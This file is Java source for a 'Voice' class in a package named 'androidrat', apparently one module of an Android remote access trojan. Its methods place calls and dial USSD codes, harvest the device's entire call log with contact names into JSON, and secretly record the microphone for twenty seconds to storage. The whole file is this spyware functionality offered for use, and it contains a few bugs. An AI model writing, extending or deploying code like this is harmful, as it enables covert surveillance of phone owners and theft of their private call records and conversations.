package com.ot.androidrat;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.telecom.TelecomManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;

public class Voice {


    public static int phoneCall(Context context, String phoneNo) {
        try {
            Intent callIntent = new Intent(Intent.ACTION_CALL);
            callIntent.setData(Uri.parse("tel:" + phoneNo));
            context.startService(callIntent);
        } catch (Exception ex) {
            return 1;
        }
        return 0;
    }

    public static String dialUSSD(String ussd, Context context) {
        StringBuilder result = new StringBuilder();
        if (ussd.equalsIgnoreCase("")) {
            return "No USSD code supplied";
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            TelephonyManager manager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                return "Permission not granted";
            }
            manager.sendUssdRequest(ussd, new TelephonyManager.UssdResponseCallback() {
                @Override
                public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                    super.onReceiveUssdResponse(telephonyManager, request, response);
                    result.append(response.toString().trim());
                    Log.i("ussd", response.toString().trim());
                }

                @Override
                public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                    super.onReceiveUssdResponseFailed(telephonyManager, request, failureCode);
                    result.append(failureCode + " " + request);
                    Log.i("ussd", failureCode + " " + request);
                }
            }, new Handler());
        }else {
            return "API level not supported";
        }
        return result.toString();
    }

    public static JSONObject readCallLog(Context context) {
        JSONObject Calls = null;
        try {
            Calls = new JSONObject();
            JSONArray list = new JSONArray();

            Uri allCalls = Uri.parse("content://call_log/calls");
            Cursor cur = context.getContentResolver().query(allCalls, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject call = new JSONObject();
                String num = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NUMBER));// for  number
                String name = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));// for name
                String duration = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DURATION));// for duration
                int type = Integer.parseInt(cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.TYPE)));// for call type, Incoming or out going.


                call.put("phoneNo", num);
                call.put("name", name);
                call.put("duration", duration);
                call.put("type", type);
                list.put(call);

            }
            Calls.put("callsList", list);
            Log.i("Result", Calls.toString());
        } catch (JSONException e) {
            e.printStackTrace();
            return null;
        }
        return Calls;
    }

    public static void recordMic(){
        MediaRecorder recorder;
        String mPath = Environment.getExternalStorageDirectory().toString() + "/DCIM/" + System.currentTimeMillis() + ".mp3";
        File audiofile = new File(mPath);
        final String TAG = "MediaRecording";
        TimerTask stopRecording;



        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(audiofile.getAbsolutePath());
        //recorder.prepare();
        recorder.start();


        stopRecording = new TimerTask() {
            @Override
            public void run() {
                //stopping recorder
                recorder.stop();
                recorder.release();

            }
        };

        new Timer().schedule(stopRecording, 20 * 1000);
    }


}
